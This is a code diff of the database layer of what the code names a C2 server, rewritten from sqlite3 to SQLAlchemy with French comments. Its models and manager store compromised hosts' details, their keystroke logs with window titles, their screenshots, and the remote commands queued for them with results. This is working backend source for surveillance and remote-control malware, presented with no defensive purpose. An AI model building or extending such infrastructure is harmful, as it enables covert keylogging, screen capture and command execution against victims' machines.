@@ -1,649 +1,364 @@
-import sqlite3
-import json
-import time
+from sqlalchemy import create_engine, Column, Integer, String, Text, Float, Boolean, DateTime, JSON, ForeignKey
+from sqlalchemy.ext.declarative import declarative_base
+from sqlalchemy.orm import sessionmaker, relationship
 from datetime import datetime
-from typing import Optional, Dict, List, Any
-import threading
+import json
 
-class Database:
-    """Gestionnaire de base de données pour le serveur C2"""
+Base = declarative_base()
+
+class Client(Base):
+    __tablename__ = 'clients'
     
-    def __init__(self, db_path: str = "c2_server.db"):
-        self.db_path = db_path
-        self.local = threading.local()
-        self.init_database()
+    id = Column(Integer, primary_key=True)
+    client_id = Column(String(100), unique=True, nullable=False, index=True)
+    ip_address = Column(String(50))
+    hostname = Column(String(100))
+    username = Column(String(100))
+    platform = Column(String(50))
+    platform_version = Column(String(100))
+    architecture = Column(String(50))
+    first_seen = Column(DateTime, default=datetime.utcnow)
+    last_seen = Column(DateTime, default=datetime.utcnow)
+    checkin_count = Column(Integer, default=0)
+    online = Column(Boolean, default=True)
+    system_info = Column(JSON)
     
-    def get_connection(self):
-        """Obtenir une connexion thread-safe à la BD"""
-        if not hasattr(self.local, 'conn'):
-            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
-            self.local.conn.row_factory = sqlite3.Row
-        return self.local.conn
+    # Relations
+    heartbeats = relationship("Heartbeat", back_populates="client", cascade="all, delete-orphan")
+    commands = relationship("Command", back_populates="client", cascade="all, delete-orphan")
+    keylogs = relationship("Keylog", back_populates="client", cascade="all, delete-orphan")
+    screenshots = relationship("Screenshot", back_populates="client", cascade="all, delete-orphan")
+    events = relationship("Event", back_populates="client", cascade="all, delete-orphan")
     
-    def init_database(self):
-        """Initialiser les tables de la base de données"""
-        conn = self.get_connection()
-        cursor = conn.cursor()
-        
-        # Table des clients
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS clients (
-                client_id TEXT PRIMARY KEY,
-                system_info TEXT,
-                first_seen REAL,
-                last_seen REAL,
-                ip_address TEXT,
-                checkin_count INTEGER DEFAULT 0,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        
-        # Table unifiée des commandes (remplace pending_commands et command_results)
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS commands (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                command_id TEXT UNIQUE,
-                client_id TEXT,
-                action TEXT,
-                data TEXT,
-                result TEXT,
-                status TEXT DEFAULT 'pending',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                sent_at REAL,
-                completed_at REAL,
-                FOREIGN KEY (client_id) REFERENCES clients(client_id)
-            )
-        ''')
-        
-        # Table des keylogs
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS keylogs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                client_id TEXT,
-                timestamp TEXT,
-                window_title TEXT,
-                key_data TEXT,
-                event_type TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (client_id) REFERENCES clients(client_id)
-            )
-        ''')
-        
-        # Table des screenshots
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS screenshots (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                client_id TEXT,
-                screenshot_data TEXT,
-                metadata TEXT,
-                timestamp REAL,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (client_id) REFERENCES clients(client_id)
-            )
-        ''')
-        
-        # Table d'historique des activités
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS activity_log (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                client_id TEXT,
-                activity_type TEXT,
-                description TEXT,
-                timestamp REAL,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (client_id) REFERENCES clients(client_id)
-            )
-        ''')
-        
-        # Index pour améliorer les performances
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)')
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, status)')
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands(command_id)')
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylogs_client ON keylogs(client_id, created_at)')
-        cursor.execute('CREATE INDEX IF NOT EXISTS idx_activity_log_client ON activity_log(client_id, timestamp)')
-        
-        conn.commit()
-        print("[DB] Base de données initialisée avec succès")
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'client_id': self.client_id,
+            'ip': self.ip_address,
+            'hostname': self.hostname,
+            'username': self.username,
+            'platform': self.platform,
+            'platform_version': self.platform_version,
+            'architecture': self.architecture,
+            'first_seen': self.first_seen.timestamp() if self.first_seen else None,
+            'last_seen': self.last_seen.timestamp() if self.last_seen else None,
+            'checkin_count': self.checkin_count,
+            'online': self.online,
+            'system_info': self.system_info or {}
+        }
+
+
+class Heartbeat(Base):
+    __tablename__ = 'heartbeats'
     
-    # ==================== GESTION DES CLIENTS ====================
+    id = Column(Integer, primary_key=True)
+    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
+    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
     
-    def register_client(self, client_id: str, system_info: Dict, ip_address: str) -> bool:
-        """Enregistrer ou mettre à jour un client"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            current_time = time.time()
-            
-            # Vérifier si le client existe déjà
-            cursor.execute('SELECT checkin_count, first_seen FROM clients WHERE client_id = ?', (client_id,))
-            existing = cursor.fetchone()
-            
-            if existing:
-                # Mettre à jour client existant
-                cursor.execute('''
-                    UPDATE clients 
-                    SET system_info = ?, last_seen = ?, ip_address = ?, 
-                        checkin_count = ?, updated_at = CURRENT_TIMESTAMP
-                    WHERE client_id = ?
-                ''', (
-                    json.dumps(system_info),
-                    current_time,
-                    ip_address,
-                    existing['checkin_count'] + 1,
-                    client_id
-                ))
-            else:
-                # Nouveau client
-                cursor.execute('''
-                    INSERT INTO clients (client_id, system_info, first_seen, last_seen, ip_address, checkin_count)
-                    VALUES (?, ?, ?, ?, ?, 1)
-                ''', (
-                    client_id,
-                    json.dumps(system_info),
-                    current_time,
-                    current_time,
-                    ip_address
-                ))
-                
-                # Log l'activité
-                self.log_activity(client_id, 'registration', 'New client registered')
-            
-            conn.commit()
-            return True
-        except Exception as e:
-            print(f"[DB] Erreur lors de l'enregistrement du client: {e}")
-            return False
+    client = relationship("Client", back_populates="heartbeats")
+
+
+class Command(Base):
+    __tablename__ = 'commands'
     
-    def update_client_heartbeat(self, client_id: str) -> bool:
-        """Mettre à jour le heartbeat d'un client"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            current_time = time.time()
-            
-            cursor.execute('''
-                UPDATE clients 
-                SET last_seen = ?, checkin_count = checkin_count + 1, updated_at = CURRENT_TIMESTAMP
-                WHERE client_id = ?
-            ''', (current_time, client_id))
-            
-            conn.commit()
-            return cursor.rowcount > 0
-        except Exception as e:
-            print(f"[DB] Erreur lors de la mise à jour du heartbeat: {e}")
-            return False
+    id = Column(Integer, primary_key=True)
+    command_id = Column(String(100), unique=True, nullable=False, index=True)
+    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
+    action = Column(String(100), nullable=False, index=True)
+    data = Column(JSON)
+    status = Column(String(50), default='pending', index=True)  # pending, sent, completed, failed
+    created_at = Column(DateTime, default=datetime.utcnow, index=True)
+    sent_at = Column(DateTime)
+    completed_at = Column(DateTime)
+    result = Column(JSON)
+    error = Column(Text)
     
-    def get_client(self, client_id: str) -> Optional[Dict]:
-        """Récupérer les informations d'un client"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('SELECT * FROM clients WHERE client_id = ?', (client_id,))
-            row = cursor.fetchone()
-            
-            if row:
-                return {
-                    'client_id': row['client_id'],
-                    'system_info': json.loads(row['system_info']),
-                    'first_seen': row['first_seen'],
-                    'last_seen': row['last_seen'],
-                    'ip': row['ip_address'],
-                    'checkin_count': row['checkin_count']
-                }
-            return None
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération du client: {e}")
-            return None
+    client = relationship("Client", back_populates="commands")
     
-    def get_all_clients(self) -> List[Dict]:
-        """Récupérer tous les clients"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
-            rows = cursor.fetchall()
-            
-            current_time = time.time()
-            clients = []
-            
-            for row in rows:
-                clients.append({
-                    'client_id': row['client_id'],
-                    'system_info': json.loads(row['system_info']),
-                    'first_seen': row['first_seen'],
-                    'last_seen': row['last_seen'],
-                    'ip': row['ip_address'],
-                    'checkin_count': row['checkin_count'],
-                    'online': current_time - row['last_seen'] < 10,
-                    'uptime_seconds': current_time - row['first_seen']
-                })
-            
-            return clients
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des clients: {e}")
-            return []
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'command_id': self.command_id,
+            'client_id': self.client_id,
+            'action': self.action,
+            'data': self.data,
+            'status': self.status,
+            'created_at': self.created_at.isoformat() if self.created_at else None,
+            'sent_at': self.sent_at.isoformat() if self.sent_at else None,
+            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
+            'result': self.result,
+            'error': self.error
+        }
+
+
+class Keylog(Base):
+    __tablename__ = 'keylogs'
     
-    def cleanup_old_clients(self, max_age_seconds: int = 3600):
-        """Supprimer les clients inactifs"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            current_time = time.time()
-            cutoff_time = current_time - max_age_seconds
-            
-            cursor.execute('SELECT client_id FROM clients WHERE last_seen < ?', (cutoff_time,))
-            old_clients = cursor.fetchall()
-            
-            for client in old_clients:
-                client_id = client['client_id']
-                self.log_activity(client_id, 'cleanup', 'Client removed due to inactivity')
-            
-            cursor.execute('DELETE FROM clients WHERE last_seen < ?', (cutoff_time,))
-            conn.commit()
-            
-            deleted_count = cursor.rowcount
-            if deleted_count > 0:
-                print(f"[DB] Supprimé {deleted_count} clients inactifs")
-            return deleted_count
-        except Exception as e:
-            print(f"[DB] Erreur lors du nettoyage des clients: {e}")
-            return 0
+    id = Column(Integer, primary_key=True)
+    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
+    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
+    window = Column(String(500))
+    keystroke = Column(String(100))
     
-    # ==================== GESTION DES COMMANDES ====================
+    client = relationship("Client", back_populates="keylogs")
     
-    def add_command(self, client_id: str, command_id: str, action: str, data: Dict) -> bool:
-        """Ajouter une nouvelle commande"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO commands (command_id, client_id, action, data, status, created_at)
-                VALUES (?, ?, ?, ?, 'pending', ?)
-            ''', (
-                command_id,
-                client_id,
-                action,
-                json.dumps(data),
-                time.time()
-            ))
-            
-            conn.commit()
-            self.log_activity(client_id, 'command_queued', f'Action: {action}')
-            return True
-        except Exception as e:
-            print(f"[DB] Erreur lors de l'ajout de la commande: {e}")
-            return False
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'client_id': self.client_id,
+            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
+            'window': self.window,
+            'keystroke': self.keystroke
+        }
+
+
+class Screenshot(Base):
+    __tablename__ = 'screenshots'
     
-    def get_pending_commands(self, client_id: str) -> List[Dict]:
-        """Récupérer les commandes en attente pour un client et les marquer comme envoyées"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT command_id, action, data, created_at 
-                FROM commands 
-                WHERE client_id = ? AND status = 'pending'
-                ORDER BY created_at ASC
-            ''', (client_id,))
-            
-            rows = cursor.fetchall()
-            commands = []
-            
-            for row in rows:
-                commands.append({
-                    'command_id': row['command_id'],
-                    'action': row['action'],
-                    'data': json.loads(row['data']),
-                    'timestamp': row['created_at']
-                })
-            
-            # Marquer comme envoyées
-            if commands:
-                current_time = time.time()
-                command_ids = [cmd['command_id'] for cmd in commands]
-                placeholders = ','.join('?' * len(command_ids))
-                cursor.execute(f'''
-                    UPDATE commands 
-                    SET status = 'sent', sent_at = ? 
-                    WHERE command_id IN ({placeholders})
-                ''', [current_time] + command_ids)
-                conn.commit()
-            
-            return commands
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des commandes: {e}")
-            return []
+    id = Column(Integer, primary_key=True)
+    client_id = Column(String(100), ForeignKey('clients.client_id'), nullable=False, index=True)
+    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
+    width = Column(Integer)
+    height = Column(Integer)
+    quality = Column(Integer)
+    size_kb = Column(Float)
+    file_path = Column(String(500))  # Chemin vers le fichier sauvegardé
+    data = Column(Text)  # Base64 si on veut stocker en BD
     
-    def add_command_result(self, command_id: str, client_id: str, result: Any) -> bool:
-        """Mettre à jour une commande avec son résultat"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            current_time = time.time()
-            
-            cursor.execute('''
-                UPDATE commands 
-                SET result = ?, status = 'completed', completed_at = ?
-                WHERE command_id = ?
-            ''', (
-                json.dumps(result),
-                current_time,
-                command_id
-            ))
-            
-            conn.commit()
-            self.log_activity(client_id, 'command_completed', f'Command {command_id} completed')
-            return cursor.rowcount > 0
-        except Exception as e:
-            print(f"[DB] Erreur lors de l'ajout du résultat: {e}")
-            return False
+    client = relationship("Client", back_populates="screenshots")
     
-    def get_command_result(self, command_id: str) -> Optional[Dict]:
-        """Récupérer le résultat d'une commande"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT result, client_id, completed_at, status
-                FROM commands 
-                WHERE command_id = ?
-            ''', (command_id,))
-            
-            row = cursor.fetchone()
-            if row and row['result']:
-                return {
-                    'result': json.loads(row['result']),
-                    'client_id': row['client_id'],
-                    'timestamp': row['completed_at'],
-                    'status': row['status']
-                }
-            return None
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération du résultat: {e}")
-            return None
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'client_id': self.client_id,
+            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
+            'width': self.width,
+            'height': self.height,
+            'quality': self.quality,
+            'size_kb': self.size_kb,
+            'file_path': self.file_path
+        }
+
+
+class Event(Base):
+    __tablename__ = 'events'
     
-    def cleanup_old_commands(self, max_age_seconds: int = 3600):
-        """Nettoyer les anciennes commandes complétées"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            cutoff_time = time.time() - max_age_seconds
-            
-            cursor.execute('''
-                DELETE FROM commands 
-                WHERE status = 'completed' AND completed_at < ?
-            ''', (cutoff_time,))
-            conn.commit()
-            
-            if cursor.rowcount > 0:
-                print(f"[DB] Supprimé {cursor.rowcount} anciennes commandes")
-        except Exception as e:
-            print(f"[DB] Erreur lors du nettoyage des commandes: {e}")
+    id = Column(Integer, primary_key=True)
+    client_id = Column(String(100), ForeignKey('clients.client_id'), index=True)
+    event_type = Column(String(50), nullable=False, index=True)  # register, disconnect, error, etc.
+    description = Column(Text)
+    data = Column(JSON)
+    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
+    severity = Column(String(20), default='info', index=True)  # info, warning, error, critical
     
-    def get_command_stats(self, client_id: str = None) -> Dict:
-        """Obtenir les statistiques des commandes"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            if client_id:
-                cursor.execute('''
-                    SELECT status, COUNT(*) as count 
-                    FROM commands 
-                    WHERE client_id = ?
-                    GROUP BY status
-                ''', (client_id,))
-            else:
-                cursor.execute('''
-                    SELECT status, COUNT(*) as count 
-                    FROM commands 
-                    GROUP BY status
-                ''')
-            
-            rows = cursor.fetchall()
-            stats = {row['status']: row['count'] for row in rows}
-            
-            return {
-                'pending': stats.get('pending', 0),
-                'sent': stats.get('sent', 0),
-                'completed': stats.get('completed', 0),
-                'total': sum(stats.values())
-            }
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des stats: {e}")
-            return {'pending': 0, 'sent': 0, 'completed': 0, 'total': 0}
+    client = relationship("Client", back_populates="events")
     
-    # ==================== GESTION DES KEYLOGS ====================
-    
-    def add_keylogs(self, client_id: str, logs: List[Dict]) -> bool:
-        """Ajouter des keylogs"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            for log in logs:
-                cursor.execute('''
-                    INSERT INTO keylogs (client_id, timestamp, window_title, key_data, event_type)
-                    VALUES (?, ?, ?, ?, ?)
-                ''', (
-                    client_id,
-                    log.get('timestamp'),
-                    log.get('window', ''),
-                    log.get('key', ''),
-                    log.get('event', 'keypress')
-                ))
-            
-            conn.commit()
-            self.log_activity(client_id, 'keylogs', f'Received {len(logs)} keylogs')
-            return True
-        except Exception as e:
-            print(f"[DB] Erreur lors de l'ajout des keylogs: {e}")
-            return False
-    
-    def get_keylogs(self, client_id: str, limit: int = 100) -> List[Dict]:
-        """Récupérer les keylogs d'un client"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT timestamp, window_title, key_data, event_type 
-                FROM keylogs 
-                WHERE client_id = ? 
-                ORDER BY id DESC 
-                LIMIT ?
-            ''', (client_id, limit))
-            
-            rows = cursor.fetchall()
-            keylogs = []
-            
-            for row in rows:
-                keylogs.append({
-                    'timestamp': row['timestamp'],
-                    'window': row['window_title'],
-                    'key': row['key_data'],
-                    'event': row['event_type']
-                })
-            
-            return keylogs
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des keylogs: {e}")
-            return []
-    
-    def get_keylog_stats(self) -> Dict:
-        """Récupérer les statistiques des keylogs"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT 
-                    client_id,
-                    COUNT(*) as log_count,
-                    MAX(timestamp) as last_log_time
-                FROM keylogs
-                GROUP BY client_id
-            ''')
-            
-            rows = cursor.fetchall()
-            stats = {}
-            current_time = time.time()
-            
-            for row in rows:
-                client_id = row['client_id']
-                client = self.get_client(client_id)
-                
-                stats[client_id] = {
-                    'log_count': row['log_count'],
-                    'last_log_time': row['last_log_time'],
-                    'client_online': client and (current_time - client['last_seen'] < 60) if client else False
-                }
-            
-            total_logs = sum(s['log_count'] for s in stats.values())
-            
-            return {
-                'total_clients_with_logs': len(stats),
-                'total_logs_stored': total_logs,
-                'clients': stats
-            }
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des stats: {e}")
-            return {'total_clients_with_logs': 0, 'total_logs_stored': 0, 'clients': {}}
-    
-    def cleanup_old_keylogs(self, max_age_seconds: int = 24 * 3600):
-        """Nettoyer les anciens keylogs"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            cutoff_time = time.time() - max_age_seconds
-            
-            # Pour SQLite, on doit comparer avec un timestamp converti
-            cursor.execute('''
-                DELETE FROM keylogs 
-                WHERE datetime(timestamp) < datetime(?, 'unixepoch')
-            ''', (cutoff_time,))
-            
-            conn.commit()
-            
-            if cursor.rowcount > 0:
-                print(f"[DB] Supprimé {cursor.rowcount} anciens keylogs")
-        except Exception as e:
-            print(f"[DB] Erreur lors du nettoyage des keylogs: {e}")
-    
-    # ==================== GESTION DES SCREENSHOTS ====================
-    
-    def add_screenshot(self, client_id: str, screenshot_data: str, metadata: Dict) -> bool:
-        """Ajouter un screenshot"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO screenshots (client_id, screenshot_data, metadata, timestamp)
-                VALUES (?, ?, ?, ?)
-            ''', (
-                client_id,
-                screenshot_data,
-                json.dumps(metadata),
-                time.time()
-            ))
-            
-            conn.commit()
-            self.log_activity(client_id, 'screenshot', 'Screenshot received')
-            return True
-        except Exception as e:
-            print(f"[DB] Erreur lors de l'ajout du screenshot: {e}")
-            return False
-    
-    def get_screenshots(self, client_id: str, limit: int = 10) -> List[Dict]:
-        """Récupérer les screenshots d'un client"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                SELECT screenshot_data, metadata, timestamp 
-                FROM screenshots 
-                WHERE client_id = ? 
-                ORDER BY id DESC 
-                LIMIT ?
-            ''', (client_id, limit))
-            
-            rows = cursor.fetchall()
-            screenshots = []
-            
-            for row in rows:
-                screenshots.append({
-                    'data': row['screenshot_data'],
-                    'metadata': json.loads(row['metadata']),
-                    'timestamp': row['timestamp']
-                })
-            
-            return screenshots
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des screenshots: {e}")
-            return []
-    
-    # ==================== GESTION DES ACTIVITÉS ====================
-    
-    def log_activity(self, client_id: str, activity_type: str, description: str):
-        """Logger une activité"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO activity_log (client_id, activity_type, description, timestamp)
-                VALUES (?, ?, ?, ?)
-            ''', (client_id, activity_type, description, time.time()))
-            
-            conn.commit()
-        except Exception as e:
-            print(f"[DB] Erreur lors du log d'activité: {e}")
-    
-    def get_activity_log(self, client_id: str = None, limit: int = 100) -> List[Dict]:
-        """Récupérer l'historique des activités"""
-        try:
-            conn = self.get_connection()
-            cursor = conn.cursor()
-            
-            if client_id:
-                cursor.execute('''
-                    SELECT * FROM activity_log 
-                    WHERE client_id = ? 
-                    ORDER BY timestamp DESC 
-                    LIMIT ?
-                ''', (client_id, limit))
-            else:
-                cursor.execute('''
-                    SELECT * FROM activity_log 
-                    ORDER BY timestamp DESC 
-                    LIMIT ?
-                ''', (limit,))
-            
-            rows = cursor.fetchall()
-            activities = []
-            
-            for row in rows:
-                activities.append({
-                    'client_id': row['client_id'],
-                    'activity_type': row['activity_type'],
-                    'description': row['description'],
-                    'timestamp': row['timestamp']
-                })
-            
-            return activities
-        except Exception as e:
-            print(f"[DB] Erreur lors de la récupération des activités: {e}")
-            return []
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'client_id': self.client_id,
+            'event_type': self.event_type,
+            'description': self.description,
+            'data': self.data,
+            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
+            'severity': self.severity
+        }
+
+
+class DatabaseManager:
+    def __init__(self, db_url='sqlite:///c2_server.db'):
+        self.engine = create_engine(db_url, echo=False)
+        Base.metadata.create_all(self.engine)
+        Session = sessionmaker(bind=self.engine)
+        self.session = Session()
     
     def close(self):
-        """Fermer la connexion à la BD"""
-        if hasattr(self.local, 'conn'):
-            self.local.conn.close()
+        self.session.close()
+    
+    # Client operations
+    def get_or_create_client(self, client_id, system_info, ip_address):
+        client = self.session.query(Client).filter_by(client_id=client_id).first()
+        
+        if not client:
+            client = Client(
+                client_id=client_id,
+                ip_address=ip_address,
+                hostname=system_info.get('hostname', 'Unknown'),
+                username=system_info.get('username', 'Unknown'),
+                platform=system_info.get('platform', 'Unknown'),
+                platform_version=system_info.get('platform_version', ''),
+                architecture=system_info.get('architecture', ''),
+                system_info=system_info,
+                first_seen=datetime.utcnow(),
+                last_seen=datetime.utcnow(),
+                online=True,
+                checkin_count=1
+            )
+            self.session.add(client)
+            self.log_event(client_id, 'register', 'Client registered', system_info, 'info')
+        else:
+            client.last_seen = datetime.utcnow()
+            client.ip_address = ip_address
+            client.system_info = system_info
+            client.online = True
+            client.checkin_count += 1
+        
+        self.session.commit()
+        return client
+    
+    def update_client_heartbeat(self, client_id):
+        client = self.session.query(Client).filter_by(client_id=client_id).first()
+        if client:
+            client.last_seen = datetime.utcnow()
+            client.checkin_count += 1
+            client.online = True
+            
+            # Enregistrer le heartbeat
+            heartbeat = Heartbeat(client_id=client_id, timestamp=datetime.utcnow())
+            self.session.add(heartbeat)
+            
+            self.session.commit()
+            return True
+        return False
+    
+    def get_all_clients(self):
+        clients = self.session.query(Client).all()
+        
+        # Marquer offline les clients inactifs (> 60 secondes)
+        current_time = datetime.utcnow()
+        for client in clients:
+            if client.last_seen:
+                time_diff = (current_time - client.last_seen).total_seconds()
+                client.online = time_diff < 60
+        
+        self.session.commit()
+        return [c.to_dict() for c in clients]
+    
+    def get_client(self, client_id):
+        return self.session.query(Client).filter_by(client_id=client_id).first()
+    
+    # Command operations
+    def create_command(self, command_id, client_id, action, data):
+        command = Command(
+            command_id=command_id,
+            client_id=client_id,
+            action=action,
+            data=data,
+            status='pending',
+            created_at=datetime.utcnow()
+        )
+        self.session.add(command)
+        self.log_event(client_id, 'command_created', f'Command {action} created', {'command_id': command_id}, 'info')
+        self.session.commit()
+        return command
+    
+    def get_pending_commands(self, client_id):
+        commands = self.session.query(Command).filter_by(
+            client_id=client_id,
+            status='pending'
+        ).all()
+        
+        # Marquer comme sent
+        for cmd in commands:
+            cmd.status = 'sent'
+            cmd.sent_at = datetime.utcnow()
+        
+        self.session.commit()
+        return commands
+    
+    def update_command_result(self, command_id, result):
+        command = self.session.query(Command).filter_by(command_id=command_id).first()
+        if command:
+            command.result = result
+            command.status = 'completed' if not result.get('error') else 'failed'
+            command.completed_at = datetime.utcnow()
+            
+            if result.get('error'):
+                command.error = str(result.get('error'))
+                self.log_event(command.client_id, 'command_failed', f'Command {command.action} failed', result, 'error')
+            else:
+                self.log_event(command.client_id, 'command_completed', f'Command {command.action} completed', None, 'info')
+            
+            self.session.commit()
+            return True
+        return False
+    
+    def get_command_result(self, command_id):
+        command = self.session.query(Command).filter_by(command_id=command_id).first()
+        return command.to_dict() if command else None
+    
+    # Keylog operations
+    def save_keylogs(self, client_id, logs):
+        for log in logs:
+            keylog = Keylog(
+                client_id=client_id,
+                timestamp=datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')) if 'timestamp' in log else datetime.utcnow(),
+                window=log.get('window', ''),
+                keystroke=log.get('keystroke', '')
+            )
+            self.session.add(keylog)
+        
+        self.session.commit()
+        self.log_event(client_id, 'keylogs_received', f'Received {len(logs)} keylogs', None, 'info')
+    
+    def get_keylogs(self, client_id, limit=100):
+        keylogs = self.session.query(Keylog).filter_by(client_id=client_id).order_by(Keylog.timestamp.desc()).limit(limit).all()
+        return [k.to_dict() for k in keylogs]
+    
+    def get_keylogs_count(self, client_id):
+        return self.session.query(Keylog).filter_by(client_id=client_id).count()
+    
+    # Event logging
+    def log_event(self, client_id, event_type, description, data=None, severity='info'):
+        event = Event(
+            client_id=client_id,
+            event_type=event_type,
+            description=description,
+            data=data,
+            severity=severity,
+            timestamp=datetime.utcnow()
+        )
+        self.session.add(event)
+        self.session.commit()
+    
+    def get_events(self, client_id=None, event_type=None, limit=100):
+        query = self.session.query(Event)
+        
+        if client_id:
+            query = query.filter_by(client_id=client_id)
+        if event_type:
+            query = query.filter_by(event_type=event_type)
+        
+        events = query.order_by(Event.timestamp.desc()).limit(limit).all()
+        return [e.to_dict() for e in events]
+    
+    # Statistics
+    def get_statistics(self):
+        total_clients = self.session.query(Client).count()
+        online_clients = self.session.query(Client).filter_by(online=True).count()
+        total_commands = self.session.query(Command).count()
+        pending_commands = self.session.query(Command).filter_by(status='pending').count()
+        total_keylogs = self.session.query(Keylog).count()
+        total_events = self.session.query(Event).count()
+        
+        return {
+            'total_clients': total_clients,
+            'online_clients': online_clients,
+            'total_commands': total_commands,
+            'pending_commands': pending_commands,
+            'total_keylogs': total_keylogs,
+            'total_events': total_events
+        }
+    
+    # Cleanup old data
+    def cleanup_old_data(self, days=30):
+        from datetime import timedelta
+        cutoff_date = datetime.utcnow() - timedelta(days=days)
+        
+        # Delete old heartbeats
+        self.session.query(Heartbeat).filter(Heartbeat.timestamp < cutoff_date).delete()
+        
+        # Delete old events
+        self.session.query(Event).filter(Event.timestamp < cutoff_date).delete()
+        
+        self.session.commit()
